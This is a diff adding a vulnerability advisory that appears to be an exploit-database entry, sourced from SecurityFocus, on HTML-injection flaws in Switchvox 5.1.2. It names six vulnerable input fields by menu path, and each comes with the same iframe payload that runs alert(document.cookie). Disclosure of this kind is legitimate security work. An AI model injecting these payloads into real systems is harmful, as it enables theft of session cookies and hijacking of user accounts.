@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/55739/info
+
+Switchvox is prone to multiple HTML-injection vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
+
+Switchvox 5.1.2 vulnerable; other versions may also be affected. 
+
+Review: Tools -> Sound Manager -> Create sound [Description]
+PoC: <iframe src="http://www.vulnerability-lab.com" onload=alert(document.cookie)></iframe>
+
+Review: Tools -> SugarCRM switchboard Panel -> setup [SugarCRM Web URL] [SugarCRM SOAP URL]
+PoC: <iframe src="http://www.vulnerability-lab.com" onload=alert(document.cookie)></iframe>
+
+Review: Setup -> Groups -> Create Extension Group [Note]
+PoC: <iframe src="http://www.vulnerability-lab.com" onload=alert(document.cookie)></iframe>
+
+Review: Setup -> Outgoing calls -> Create Outgoing Call rule [Note]
+PoC: <iframe src="http://www.vulnerability-lab.com" onload=alert(document.cookie)></iframe>
+
+Review: Setup -> Incoming Calls -> Caller DID routes -> Create Single DID Route [Note]
+PoC:<iframe src="http://www.vulnerability-lab.com" onload=alert(document.cookie)></iframe>
+
+Review: Setup -> Incoming Calls -> Caller ID Rules -> Create Call transfer Call [Note]
+PoC: <iframe src="http://www.vulnerability-lab.com" onload=alert(document.cookie)></iframe> 
